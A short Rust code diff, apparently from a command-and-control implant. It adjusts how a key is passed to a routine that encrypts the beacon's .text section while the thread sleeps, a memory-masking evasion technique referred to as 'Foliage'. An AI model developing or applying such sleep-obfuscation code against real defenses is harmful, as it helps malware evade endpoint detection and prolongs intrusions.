@@ -280,9 +280,9 @@ impl MemoryMaskKit for LiveMemoryMask {
         // Foliage helper context — the beacon thread is parked in alertable
         // sleep, NOT executing .text.
         unsafe {
-            crate::mem::mask_text(region.base, region.len, &key);
+            crate::mem::mask_text(region.base, region.len, key);
         }
-        Ok(MaskToken::new(region.base, region.len, key))
+        Ok(MaskToken::new(region.base, region.len, *key))
     }
 
     fn unmask(&self, token: MaskToken) -> Result<(), EvasionError> {
